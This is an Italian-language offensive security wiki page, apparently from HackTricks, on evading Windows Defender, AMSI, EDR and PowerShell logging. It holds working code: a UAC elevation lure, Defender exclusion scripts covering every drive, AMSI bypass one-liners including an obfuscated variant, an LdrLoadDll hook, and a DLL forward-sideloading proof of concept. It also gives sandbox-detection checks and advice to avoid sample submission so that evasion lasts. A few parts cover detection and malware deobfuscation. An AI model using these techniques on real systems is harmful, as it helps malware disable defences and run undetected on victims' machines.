# Bypass dell'antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Questa pagina è stata scritta inizialmente da** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Arrestare Defender

- [defendnot](https://github.com/es3n1n/defendnot): Uno strumento per impedire il funzionamento di Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Uno strumento per impedire il funzionamento di Windows Defender fingendo di essere un altro antivirus.
- [Disabilitare Defender se si è amministratori](basic-powershell-for-pentesters/README.md)

### Esca UAC in stile installer prima di manomettere Defender

I loader pubblici che si spacciano per cheat di videogiochi vengono spesso distribuiti come installer Node.js/Nexe non firmati che prima **chiedono all'utente l'elevazione** e solo dopo neutralizzano Defender. Il flusso è semplice:

1. Verifica la presenza di un contesto amministrativo con `net session`. Il comando riesce solo quando il chiamante dispone dei diritti di amministratore, quindi un errore indica che il loader è in esecuzione come utente standard.
2. Si riavvia immediatamente con il verbo `RunAs` per attivare il previsto prompt di consenso UAC preservando la riga di comando originale.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Le vittime credono già di stare installando software “cracked”, quindi il prompt viene solitamente accettato, dando al malware i diritti necessari per modificare la policy di Defender.<sup>[[26]](#references)</sup>

### Esclusioni `MpPreference` generali per ogni lettera di unità

Una volta ottenuti i privilegi elevati, le chain in stile GachiLoader massimizzano i punti ciechi di Defender invece di disabilitare direttamente il servizio. Il loader termina prima il watchdog della GUI (`taskkill /F /IM SecHealthUI.exe`) e poi imposta **esclusioni estremamente ampie**, in modo che ogni profilo utente, directory di sistema e disco rimovibile diventi non analizzabile:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Osservazioni chiave:

- Il loop attraversa ogni filesystem montato (D:\, E:\, chiavette USB, ecc.), quindi **qualsiasi payload futuro depositato ovunque sul disco viene ignorato**.
- L'esclusione dell'estensione `.sys` è lungimirante: gli attacker mantengono la possibilità di caricare in seguito driver non firmati senza dover modificare nuovamente Defender.
- Tutte le modifiche vengono applicate in `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, consentendo agli stage successivi di confermare che le esclusioni persistono o di ampliarle senza riattivare UAC.

Poiché nessun servizio di Defender viene arrestato, i controlli di integrità più semplici continuano a segnalare “antivirus attivo”, anche se l'ispezione in tempo reale non analizza mai quei percorsi.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

Attualmente, gli AV utilizzano metodi diversi per verificare se un file è malicious o meno: static detection, dynamic analysis e, per gli EDR più avanzati, behavioural analysis.

### **Static detection**

La static detection si ottiene individuando stringhe malicious note o array di byte all'interno di un binary o script, oltre a estrarre informazioni dal file stesso (ad esempio descrizione del file, nome dell'azienda, firme digitali, icona, checksum, ecc.). Ciò significa che l'utilizzo di tool pubblici noti può farti individuare più facilmente, poiché probabilmente sono già stati analizzati e contrassegnati come malicious. Esistono alcuni modi per aggirare questo tipo di detection:

- **Encryption**

Se cripti il binary, l'AV non avrà modo di rilevare il tuo programma, ma avrai bisogno di una sorta di loader per decrittarlo ed eseguirlo in memoria.

- **Obfuscation**

A volte è sufficiente modificare alcune stringhe nel binary o nello script per superare l'AV, ma può essere un'attività dispendiosa in termini di tempo, a seconda di ciò che stai cercando di offuscare.

- **Custom tooling**

Se sviluppi i tuoi tool, non esisteranno signature malicious note, ma ciò richiede molto tempo e impegno.

> [!TIP]
> Un buon modo per verificare la static detection di Windows Defender è [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). In pratica, divide il file in più segmenti e chiede a Defender di analizzarli singolarmente; in questo modo può dirti esattamente quali stringhe o byte sono stati contrassegnati nel tuo binary.

Ti consiglio vivamente di dare un'occhiata a questa [playlist di YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sulla pratica AV Evasion.

### **Dynamic analysis**

La dynamic analysis si verifica quando l'AV esegue il tuo binary in una sandbox e osserva le attività malicious (ad esempio tentare di decrittare e leggere le password del browser, eseguire un minidump su LSASS, ecc.). Questa parte può essere un po' più complessa da gestire, ma ecco alcune cose che puoi fare per eludere le sandbox.

- **Sleep before execution** A seconda di come viene implementato, può essere un ottimo modo per aggirare la dynamic analysis dell'AV. Gli AV hanno pochissimo tempo per analizzare i file, in modo da non interrompere il workflow dell'utente, quindi l'utilizzo di sleep prolungati può disturbare l'analisi dei binary. Il problema è che molte sandbox degli AV possono semplicemente saltare lo sleep, a seconda di come è stato implementato.
- **Checking machine's resources** Di solito le sandbox hanno pochissime risorse a disposizione (ad esempio < 2 GB di RAM), altrimenti potrebbero rallentare la macchina dell'utente. Anche qui puoi essere molto creativo, ad esempio controllando la temperatura della CPU o persino la velocità delle ventole: non tutto sarà implementato nella sandbox.
- **Machine-specific checks** Se vuoi prendere di mira un utente la cui workstation è unita al dominio "contoso.local", puoi controllare il dominio del computer per verificare se corrisponde a quello specificato; in caso contrario, puoi far terminare il programma.

È emerso che il computername della Sandbox di Microsoft Defender è HAL9TH; quindi puoi verificare il nome del computer nel tuo malware prima della detonation. Se il nome corrisponde a HAL9TH, significa che ti trovi nella sandbox di Defender, quindi puoi far terminare il programma.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Altri ottimi consigli di [@mgeeky](https://twitter.com/mariuszbit) per contrastare le sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Come abbiamo già detto in precedenza in questo post, i **tool pubblici** alla fine verranno **rilevati**, quindi dovresti porti una domanda:

Ad esempio, se vuoi eseguire il dump di LSASS, **hai davvero bisogno di usare mimikatz**? Oppure potresti usare un progetto diverso, meno conosciuto, che esegua anch'esso il dump di LSASS?

La risposta corretta probabilmente è la seconda. Prendendo mimikatz come esempio, è probabilmente uno dei malware più segnalati dagli AV e dagli EDR, se non il più segnalato; sebbene il progetto in sé sia davvero interessante, è anche un incubo da utilizzare per aggirare gli AV. Cerca quindi alternative per ottenere ciò che stai cercando di realizzare.

> [!TIP]
> Quando modifichi i tuoi payload per l'evasion, assicurati di **disattivare l'invio automatico dei sample** in Defender e, per favore, seriamente, **NON CARICARE SU VIRUSTOTAL** se il tuo obiettivo è ottenere l'evasion a lungo termine. Se vuoi verificare se il tuo payload viene rilevato da un AV specifico, installalo su una VM, prova a disattivare l'invio automatico dei sample e testalo lì finché non sei soddisfatto del risultato.

## EXEs vs DLLs

Quando possibile, **dai sempre priorità all'utilizzo delle DLL per l'evasion**; secondo la mia esperienza, i file DLL vengono generalmente **rilevati e analizzati molto meno**, quindi in alcuni casi è un trucco molto semplice per evitare la detection (se, naturalmente, il tuo payload può essere eseguito come DLL).

Come possiamo vedere in questa immagine, un DLL Payload di Havoc ha un detection rate di 4/26 su antiscan.me, mentre il payload EXE ha un detection rate di 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>confronto su antiscan.me tra un normale payload EXE di Havoc e una normale DLL di Havoc</p></figcaption></figure>

Ora mostreremo alcuni trucchi che puoi utilizzare con i file DLL per essere molto più stealth.

## DLL Sideloading & Proxying

Il **DLL Sideloading** sfrutta l'ordine di ricerca delle DLL utilizzato dal loader, posizionando l'applicazione vittima e i payload malicious l'uno accanto all'altro.

Puoi verificare quali programmi sono suscettibili al DLL Sideloading utilizzando [Siofra](https://github.com/Cybereason/siofra) e il seguente script PowerShell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Questo comando restituirà l'elenco dei programmi vulnerabili al DLL hijacking all'interno di "C:\Program Files\\" e dei file DLL che tentano di caricare.

Ti consiglio vivamente di **esplorare personalmente i programmi DLL Hijackable/Sideloadable**; questa tecnica è piuttosto stealthy se eseguita correttamente, ma se utilizzi programmi DLL Sideloadable noti pubblicamente, potresti essere individuato facilmente.

Il semplice inserimento di una DLL malevola con il nome che un programma si aspetta di caricare non eseguirà il tuo payload, poiché il programma si aspetta alcune funzioni specifiche all'interno di quella DLL. Per risolvere questo problema, useremo un'altra tecnica chiamata **DLL Proxying/Forwarding**.

**DLL Proxying** inoltra le chiamate effettuate da un programma dalla DLL proxy (e malevola) alla DLL originale, preservando così la funzionalità del programma e consentendo di gestire l'esecuzione del tuo payload.

Utilizzerò il progetto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) di [@flangvik](https://twitter.com/Flangvik/)

Questi sono i passaggi che ho seguito:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
L'ultimo comando ci fornirà 2 file: un template del codice sorgente della DLL e la DLL originale rinominata.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Questi sono i risultati:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sia il nostro shellcode (codificato con [SGN](https://github.com/EgeBalci/sgn)) sia la proxy DLL hanno un tasso di rilevamento di 0/26 su [antiscan.me](https://antiscan.me)! Direi che è un successo.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ti **consiglio vivamente** di guardare il [VOD di S3cur3Th1sSh1t su Twitch](https://www.twitch.tv/videos/1644171543) su DLL Sideloading e anche il [video di ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) per saperne di più su ciò che abbiamo discusso in modo più approfondito.

### Abusing Forwarded Exports (ForwardSideLoading)

I moduli Windows PE possono esportare funzioni che sono in realtà dei "forwarder": invece di puntare al codice, la voce di export contiene una stringa ASCII nella forma `TargetDll.TargetFunc`. Quando un caller risolve l'export, il loader di Windows:

- Carica `TargetDll` se non è già stato caricato
- Risolve `TargetFunc` da esso

Comportamenti chiave da comprendere:
- Se `TargetDll` è una KnownDLL, viene fornito dal namespace protetto KnownDLLs (ad esempio ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Se `TargetDll` non è una KnownDLL, viene utilizzato il normale ordine di ricerca delle DLL, che include la directory del modulo che sta eseguendo la risoluzione del forward.

Questo abilita una primitiva di sideloading indiretto: trovare una DLL firmata che esporta una funzione inoltrata a un nome di modulo non-KnownDLL, quindi collocare quella DLL firmata insieme a una DLL controllata dall'attaccante denominata esattamente come il modulo target inoltrato. Quando viene richiamato l'export inoltrato, il loader risolve il forward e carica la tua DLL dalla stessa directory, eseguendo il tuo `DllMain`.<sup>[[13]](#references)</sup>

Esempio osservato su Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` non è una KnownDLL, quindi viene risolta tramite il normale ordine di ricerca.

PoC (copia-incolla):
1) Copia la DLL di sistema firmata in una cartella scrivibile
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Inserisci una `NCRYPTPROV.dll` malevola nella stessa cartella. È sufficiente un DllMain minimale per ottenere l'esecuzione del codice; non è necessario implementare la funzione inoltrata per attivare DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Attiva il forward con un LOLBin firmato:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Comportamento osservato:
- rundll32 (firmato) carica il side-by-side `keyiso.dll` (firmato)
- Durante la risoluzione di `KeyIsoSetAuditingInterface`, il loader segue il forward verso `NCRYPTPROV.SetAuditingInterface`
- Il loader carica quindi `NCRYPTPROV.dll` da `C:\test` ed esegue il suo `DllMain`
- Se `SetAuditingInterface` non è implementata, riceverai un errore "missing API" solo dopo che `DllMain` è già stato eseguito

Suggerimenti per la ricerca:
- Concentrati sugli export inoltrati in cui il modulo di destinazione non è una KnownDLL. Le KnownDLL sono elencate in `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Puoi enumerare gli export inoltrati con strumenti come:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consulta l'inventario dei forwarder di Windows 11 per cercare candidati: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Idee per il rilevamento/la difesa:
- Monitora i LOLBins (ad es., rundll32.exe) che caricano DLL firmate da percorsi non di sistema, seguiti dal caricamento di non-KnownDLLs con lo stesso nome base da quella directory
- Genera un alert per catene processo/modulo come: `rundll32.exe` → `keyiso.dll` non di sistema → `NCRYPTPROV.dll` in percorsi scrivibili dall'utente
- Applica policy di code integrity (WDAC/AppLocker) e nega i permessi di scrittura+esecuzione nelle directory delle applicazioni

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Puoi usare Freeze per caricare ed eseguire il tuo shellcode in modo furtivo.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> L'evasion è un semplice gioco del gatto e del topo: ciò che funziona oggi potrebbe essere rilevato domani, quindi non affidarti mai a un solo strumento; se possibile, prova a concatenare più tecniche di evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

Gli EDR spesso inseriscono **user-mode inline hooks** negli stub delle syscall di `ntdll.dll`. Per bypassare questi hook, puoi generare stub di syscall **direct** o **indirect** che caricano l'**SSN** (System Service Number) corretto ed effettuano la transizione alla kernel mode senza eseguire l'entrypoint dell'export sottoposto a hook.<sup>[[32]](#references)</sup>

**Opzioni di invocazione:**
- **Direct (embedded)**: inserisce un'istruzione `syscall`/`sysenter`/`SVC #0` nello stub generato (nessun accesso all'export di `ntdll`).
- **Indirect**: esegue un jump verso un gadget `syscall` esistente all'interno di `ntdll`, in modo che la transizione al kernel sembri originare da `ntdll` (utile per l'evasion euristica); **randomized indirect** seleziona un gadget da un pool a ogni chiamata.
- **Egg-hunt**: evita di incorporare sul disco la sequenza di opcode statica `0F 05`; risolve una sequenza syscall a runtime.

**Strategie di risoluzione dell'SSN resistenti agli hook:**
- **FreshyCalls (VA sort)**: deduce gli SSN ordinando gli stub delle syscall in base all'indirizzo virtuale anziché leggendo i byte dello stub.
- **SyscallsFromDisk**: mappa una `\KnownDlls\ntdll.dll` pulita, legge gli SSN dalla sua sezione `.text`, quindi esegue l'unmap (bypassando tutti gli hook in memoria).
- **RecycledGate**: combina l'inferenza degli SSN tramite ordinamento VA con la validazione degli opcode quando uno stub è pulito; se è sottoposto a hook, ricorre all'inferenza tramite VA.
- **HW Breakpoint**: imposta DR0 sull'istruzione `syscall` e usa un VEH per acquisire l'SSN da `EAX` a runtime, senza analizzare i byte sottoposti a hook.

Esempio di utilizzo di SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI è stato creato per prevenire il "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inizialmente, gli AV erano in grado di eseguire la scansione solo dei **file su disco**, quindi, se si riusciva in qualche modo a eseguire i payload **direttamente in-memory**, l'AV non poteva fare nulla per impedirlo, poiché non disponeva di una visibilità sufficiente.

La funzionalità AMSI è integrata nei seguenti componenti di Windows.

- User Account Control, o UAC (elevazione di EXE, COM, MSI o installazione di ActiveX)
- PowerShell (script, uso interattivo e valutazione dinamica del codice)
- Windows Script Host (wscript.exe e cscript.exe)
- JavaScript e VBScript
- Macro VBA di Office

Consente alle soluzioni antivirus di ispezionare il comportamento degli script esponendone i contenuti in una forma non cifrata e non offuscata.

L'esecuzione di `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produrrà il seguente alert su Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Si noti come anteponga `amsi:` e quindi il percorso dell'eseguibile da cui è stato eseguito lo script, in questo caso, powershell.exe

Non abbiamo scritto alcun file su disco, ma siamo comunque stati rilevati in-memory a causa di AMSI.

Inoltre, a partire da **.NET 4.8**, anche il codice C# viene eseguito tramite AMSI. Questo influisce persino su `Assembly.Load(byte[])` per caricare un'esecuzione in-memory. Per questo motivo, per l'esecuzione in-memory è consigliato utilizzare versioni precedenti di .NET (come la 4.7.2 o inferiori) se si vuole eludere AMSI.

Esistono un paio di modi per aggirare AMSI:

- **Obfuscation**

Poiché AMSI funziona principalmente con rilevamenti statici, modificare gli script che si tenta di caricare può essere un buon modo per eludere il rilevamento.

Tuttavia, AMSI è in grado di deoffuscare gli script anche se presentano più livelli, quindi l'obfuscation potrebbe essere una scelta sbagliata a seconda di come viene eseguita. Questo rende l'elusione tutt'altro che immediata. A volte, però, è sufficiente modificare un paio di nomi di variabili e il problema è risolto, quindi dipende da quanto qualcosa è stato segnalato.

- **AMSI Bypass**

Poiché AMSI viene implementato caricando una DLL nel processo powershell (e anche nei processi cscript.exe, wscript.exe, ecc.), è possibile manometterlo facilmente anche eseguendo il codice come utente non privilegiato. A causa di questa falla nell'implementazione di AMSI, i ricercatori hanno trovato diversi modi per eludere la scansione AMSI.

**Forcing an Error**

Forzare il fallimento dell'inizializzazione di AMSI (amsiInitFailed) farà sì che non venga avviata alcuna scansione per il processo corrente. Questo metodo è stato divulgato inizialmente da [Matt Graeber](https://twitter.com/mattifestation) e Microsoft ha sviluppato una signature per impedirne un utilizzo più diffuso.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
È bastata una sola riga di codice powershell per rendere AMSI inutilizzabile per il processo powershell corrente. Questa riga è stata ovviamente rilevata da AMSI stesso, quindi è necessaria qualche modifica per utilizzare questa tecnica.

Ecco un AMSI bypass modificato, tratto da questo [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Tieni presente che probabilmente verrà segnalato non appena questo post sarà pubblicato, quindi non dovresti pubblicare alcun code se il tuo piano è rimanere undetected.

**Memory Patching**

Questa tecnica è stata scoperta inizialmente da [@RastaMouse](https://twitter.com/_RastaMouse/) e consiste nel trovare l'indirizzo della funzione "AmsiScanBuffer" in amsi.dll (responsabile della scansione dell'input fornito dall'utente) e sovrascriverlo con istruzioni che restituiscano il code di E_INVALIDARG; in questo modo, il risultato della scansione effettiva sarà 0, interpretato come un risultato pulito.

> [!TIP]
> Leggi [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) per una spiegazione più dettagliata.

Esistono anche molte altre tecniche utilizzate per bypassare AMSI con powershell; consulta [**questa pagina**](basic-powershell-for-pentesters/index.html#amsi-bypass) e [**questo repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) per saperne di più.

### Blocco di AMSI impedendo il caricamento di amsi.dll (hook LdrLoadDll)

AMSI viene inizializzato solo dopo che `amsi.dll` è stato caricato nel processo corrente. Un bypass robusto e indipendente dal linguaggio consiste nell'applicare un hook in user-mode su `ntdll!LdrLoadDll` che restituisca un errore quando il modulo richiesto è `amsi.dll`. Di conseguenza, AMSI non viene mai caricato e per quel processo non viene eseguita alcuna scansione.<sup>[[23]](#references)</sup>

Schema dell'implementazione (pseudocodice C/C++ x64):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Note
- Funziona con PowerShell, WScript/CScript e custom loader allo stesso modo (qualsiasi componente che altrimenti caricherebbe AMSI).
- Da abbinare all'invio degli script tramite stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) per evitare artefatti di lunga durata nella command line.
- Utilizzato anche da loader eseguiti tramite LOLBins (ad es. `regsvr32` che chiama `DllRegisterServer`).

Anche lo strumento **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** genera script per bypassare AMSI.
Anche lo strumento **[https://amsibypass.com/](https://amsibypass.com/)** genera script per bypassare AMSI che evitano le signature tramite funzioni definite dall'utente randomizzate, variabili, espressioni di caratteri e applicando una capitalizzazione casuale dei caratteri alle keyword di PowerShell per evitare le signature.

**Rimuovere la signature rilevata**

Puoi usare uno strumento come **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** per rimuovere la signature AMSI rilevata dalla memoria del processo corrente. Questo strumento funziona scansionando la memoria del processo corrente alla ricerca della signature AMSI e sovrascrivendola con istruzioni NOP, rimuovendola di fatto dalla memoria.

**Prodotti AV/EDR che utilizzano AMSI**

Puoi trovare un elenco dei prodotti AV/EDR che utilizzano AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Usare PowerShell versione 2**
Se usi PowerShell versione 2, AMSI non verrà caricato, quindi puoi eseguire gli script senza che vengano scansionati da AMSI. Puoi fare così:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging è una funzionalità che consente di registrare tutti i comandi PowerShell eseguiti su un sistema. Questo può essere utile per finalità di auditing e troubleshooting, ma può anche rappresentare un **problema per gli attacker che vogliono eludere il rilevamento**.

Per bypassare PowerShell logging, puoi usare le seguenti tecniche:

- **Disabilitare PowerShell Transcription e Module Logging**: puoi usare uno strumento come [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) a questo scopo.
- **Usare Powershell version 2**: se usi PowerShell version 2, AMSI non verrà caricato, quindi potrai eseguire i tuoi script senza che vengano analizzati da AMSI. Puoi farlo con: `powershell.exe -version 2`
- **Usare una sessione PowerShell unmanaged**: usa [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) per ospitare PowerShell senza avviare `powershell.exe` (l'approccio usato da `powerpick` di Cobalt Strike). Questo elude i controlli legati specificamente al processo `powershell.exe`, ma non disabilita intrinsecamente AMSI, Script Block Logging o tutte le altre difese di PowerShell; la copertura dipende dal runtime e dall'implementazione dell'host.


## Obfuscation

> [!TIP]
> Diverse tecniche di obfuscation si basano sulla cifratura dei dati, aumentando l'entropia del binary e rendendo più semplice per gli AV e gli EDR rilevarlo. Fai attenzione e valuta di applicare la cifratura solo a sezioni specifiche del tuo codice che sono sensibili o devono essere nascoste.

### Deobfuscating Binaries .NET protetti da ConfuserEx

Quando si analizza malware che usa ConfuserEx 2 (o fork commerciali), è comune incontrare diversi livelli di protezione che bloccano decompiler e sandbox. Il workflow riportato di seguito **ripristina in modo affidabile un IL quasi originale**, che può essere successivamente decompilato in C# con strumenti come dnSpy o ILSpy.<sup>[[10]](#references)</sup>

1. Rimozione dell'anti-tampering – ConfuserEx cifra ogni *method body* e lo decifra all'interno del costruttore statico del *module* (`<Module>.cctor`). Inoltre modifica il checksum PE, quindi qualsiasi modifica causerà il crash del binary. Usa **AntiTamperKiller** per individuare le tabelle di metadata cifrate, recuperare le chiavi XOR e riscrivere un assembly pulito:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
L'output contiene i 6 parametri anti-tamper (`key0-key3`, `nameHash`, `internKey`), che possono essere utili per creare il tuo unpacker.

2. Recupero dei simboli / control-flow – fornisci il file *clean* a **de4dot-cex** (un fork di de4dot compatibile con ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flag:
• `-p crx` – seleziona il profilo ConfuserEx 2
• de4dot annullerà il control-flow flattening, ripristinerà namespace, classi e nomi delle variabili originali e decifrerà le stringhe costanti.

3. Rimozione delle proxy-call – ConfuserEx sostituisce le chiamate dirette ai metodi con wrapper leggeri (le cosiddette *proxy call*) per compromettere ulteriormente la decompilazione. Rimuovile con **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Dopo questo passaggio dovresti osservare normali API .NET come `Convert.FromBase64String` o `AES.Create()` invece di funzioni wrapper opache (`Class8.smethod_10`, …).

4. Pulizia manuale – esegui il binary risultante con dnSpy, cerca grandi blob Base64 o l'uso di `RijndaelManaged`/`TripleDESCryptoServiceProvider` per individuare il payload *reale*. Spesso il malware lo memorizza come un array di byte codificato in TLV e inizializzato all'interno di `<Module>.byte_0`.

La catena descritta ripristina il flusso di esecuzione **senza dover eseguire il sample malevolo**, risultando utile quando si lavora su una workstation offline.

> 🛈  ConfuserEx produce un custom attribute denominato `ConfusedByAttribute`, che può essere usato come IOC per eseguire automaticamente il triage dei sample.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: offuscatore C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lo scopo di questo progetto è fornire un fork open-source della suite di compilazione [LLVM](http://www.llvm.org/) in grado di offrire una maggiore sicurezza del software tramite [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) e protezione contro le manomissioni.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator dimostra come utilizzare il linguaggio `C++11/14` per generare, a compile time, codice offuscato senza usare tool esterni e senza modificare il compilatore.
- [**obfy**](https://github.com/fritzone/obfy): Aggiunge un livello di operazioni offuscate generate dal framework di template metaprogramming di C++, rendendo la vita della persona che vuole crackare l'applicazione un po' più difficile.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz è un binary obfuscator x64 in grado di offuscare diversi PE file, tra cui: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame è un semplice motore di codice metamorfico per eseguibili arbitrari.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator è un framework di code obfuscation granulare per linguaggi supportati da LLVM che utilizza ROP (return-oriented programming). ROPfuscator offusca un programma a livello di assembly code trasformando le istruzioni normali in ROP chain, ostacolando la nostra concezione naturale del normale control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt è un .NET PE Crypter scritto in Nim
